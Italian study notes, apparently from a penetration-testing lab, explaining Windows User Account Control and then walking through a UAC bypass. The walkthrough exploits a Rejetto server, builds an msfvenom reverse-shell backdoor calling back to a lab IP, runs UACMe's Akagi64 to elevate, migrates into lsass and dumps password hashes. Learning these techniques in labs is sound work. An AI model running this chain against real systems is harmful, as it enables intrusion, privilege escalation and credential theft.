L'User Account Control (UAC), o Controllo dell'Account Utente, è una funzione di sicurezza introdotta da Microsoft in Windows Vista per prevenire l'esecuzione di attività potenzialmente pericolose o non autorizzate. Questo sistema è stato perfezionato in Windows 7 e continua a essere presente nelle versioni più recenti di Windows, come Windows 10 e Windows 11.

Ecco alcuni punti chiave riguardanti il Controllo dell'Account Utente (UAC):
```
### UAC - Scopo:
UAC impedisce che l'utente possa modificare liberamente le impostazioni più "delicate" del computer e aiuta a individuare software malevoli che tentano di apportare modifiche al sistema.

### UAC - Funzionamento: 
Quando si avvia un nuovo programma con privilegi amministrativi, il UAC richiede all'utente una conferma tramite un prompt. Questo serve come prima barriera per fermare attività potenzialmente rischiose.

### UAC - Exploit Disattivazione temporanea: 
Se hai bisogno di disattivare temporaneamente il UAC, puoi farlo seguendo questi passaggi:

# UAC - Disattivazione Windows 10/11: 
> Cerca "pannello di controllo" nella barra di ricerca.
> Seleziona l'icona del Pannello di controllo.
> Fai clic su "Account utente" e poi su "Modifica le impostazioni di controllo dell'account utente".
> Imposta l'opzione su "Non notificare mai" e salva i cambiamenti.

# UAC - Bypassing with UACMe + BackDoor
> Carico una una backdoor in directory
> Carico l'eseguibile di UACMe (Akagi64)
> Ottengo una meterpreter/cmd shell ogni volta bypasso il check dell'UAC

# UAC - Altre opzioni:
> Puoi disattivare il UAC solo per gli amministratori, utilizzare l'Editor del registro di sistema o gli Editor Criteri di gruppo locali (solo nelle versioni Pro di Windows), o disattivarlo dal Prompt dei comandi.

```


Migrazione processo:
```
### Migrazione Processo:
Il processo meterpreter spesso deve essere migrato per:

> Nascondere il processo per ottenere persistenza ed evitare il rilevamento, in quanto il processo che viene creato dalla sessione meterpreter è rumoroso.

> Modificare l'architettura del processo per eseguire alcuni payload con l'architettura corrente. Ad esempio, se esiste un sistema a 64 bit e il nostro processo di meterpreter è a 86 bit, potrebbero verificarsi alcuni problemi legati all'architettura se proviamo a eseguire alcuni exploit contro la sessione acquisita.

> Migrare a un processo più stabile come explorer.exe per nascondere la sessione ed ottenere persistenza.
```



```
# Migrare un processo
> ps aux | grep explorer.exe 
> ps -s explorer
> pgrep explorer

> migrate <PID>
> migrate -s explorer.exe




# UACMe - Exploitation UAC 

> nmap -sV -p 80 10.4.19.119`
> Exploit rejetto
> Got meterpreter
> getuid

> pgrep explorer
> migrate 2708
> getprivs
> shell
> net user
> net localgroup administrators
[+] Access denied

Use UACMe Akagmi already present on the attack machine
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > 'backdoor.exe'

> use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.4.2
set LPORT 1234
run

Per disattivare il UAC, carico una backdor + l'eseguibile di Akagi64.
Go to old meterpreter session:
> cd C:\\\\
> mkdir Temp
> cd Temp
> upload /root/backdoor.exe
> upload /root/Desktop/tools/UACME/Akagi64.exe

Accedo alla directory dove ho caricato gli eseguibili, e inserisco il full path della backdor quando lancio Akagi64.exe:
> cd C:\\Users\admin\AppData\Local\Temp
> Akagi64.exe 23 C:\\Users\admin\AppData\Local\Temp\\backdoor.exe

Now ottengo una backdoor sulla Reverse Shell TCP precedentemente lanciata:
> getsystem
[Migrate to a NT AUTHORITY\\SYSTEM service]

> ps -S lsass.exe
> migrate 692
> hashdump

```